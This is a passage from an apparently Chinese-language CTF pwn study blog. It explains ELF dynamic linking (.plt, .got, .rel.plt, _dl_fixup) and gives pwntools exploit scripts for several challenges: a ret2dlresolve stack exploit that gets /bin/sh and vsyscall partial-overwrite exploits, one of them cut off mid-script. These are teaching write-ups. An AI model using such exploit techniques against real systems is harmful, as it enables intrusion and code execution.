class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">    assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> elf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunmerWeek2</title>
      <link href="/posts/33749/"/>
      <url>/posts/33749/</url>
      
        <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="先知"><a href="#先知" class="headerlink" title="先知"></a>先知</h2><p>建议参考<a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">关于学习ret2_dl_runtime_resolve的总结 - ZikH26</a></p><p>需要先了解一些在动态连接中有巨大作用的section</p><h3 id="plt"><a href="#plt" class="headerlink" title=".plt"></a>.plt</h3><p><strong>所在segment:代码段</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到.got.plt中, 然后跳转到该函数; 或者直接在.got.plt中查找并跳转到对应外部函数(如果已经填充过).</p><p>一个plt表项有三个字段</p><ol><li>跳转到对应的got表的地址</li><li>压栈,该参数是对应函数在.rel.plt上的偏移</li><li>跳转到plt[0],plt[0]处的代码pushGOT[1]然后jmpGOT[2]</li></ol><h3 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h3><p><strong>所在segment:数据段</strong></p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>前者用于存放全局变量的地址中和不需要延迟绑定的函数的地址。</strong></p><p><strong>后者用于存放需要延迟绑定的函数的地址</strong></p><p>.got.plt相当于.plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为跳转回.plt的代码, 并执行查找.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址</li></ul><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="plt-got"><a href="#plt-got" class="headerlink" title=".plt.got"></a>.plt.got</h3><p><strong>所在segment:代码段</strong></p><p>.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了很多动态链接所需的关键信息，主要看DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><p>它是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p> 第一次调用库函数时</p><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc-2.23/elf/dl-runtime.c实现的</p><p>ret2dlresolve的情况更多适用于没有打印函数的程序，毕竟有了打印函数就可以直接用ret2libc了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="xdctf2015-pwn200-32位栈传参式"><a href="#xdctf2015-pwn200-32位栈传参式" class="headerlink" title="xdctf2015-pwn200(32位栈传参式)"></a>xdctf2015-pwn200(32位栈传参式)</h3><p>也可以用ret2libc做</p><p>用ret2dlresolve做的话就是很常规的套路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28525)#***</span></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line"></span><br><span class="line">st_info=<span class="number">12</span></span><br><span class="line"></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>   <span class="comment">#偏移是下标偏移</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type)</span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span>    <span class="comment">#偏移是地址偏移</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) </span><br><span class="line">payload1+=p32(four_pop_ret)</span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">b&#x27;abcd&#x27;</span><span class="comment">#返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#指向binsh</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span>   <span class="comment">#</span></span><br><span class="line">payload2+=<span class="string">b&#x27;bbbb&#x27;</span>   <span class="comment">#read有三个参数</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezzzz-64位"><a href="#ezzzz-64位" class="headerlink" title="ezzzz(64位)"></a>ezzzz(64位)</h3><p>64位full relro有点难搞,网上找到的题解似乎用的方式与linkmap无关</p><h1 id="任务Ⅱ"><a href="#任务Ⅱ" class="headerlink" title="任务Ⅱ"></a>任务Ⅱ</h1><p><strong>vsyscall</strong></p><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span 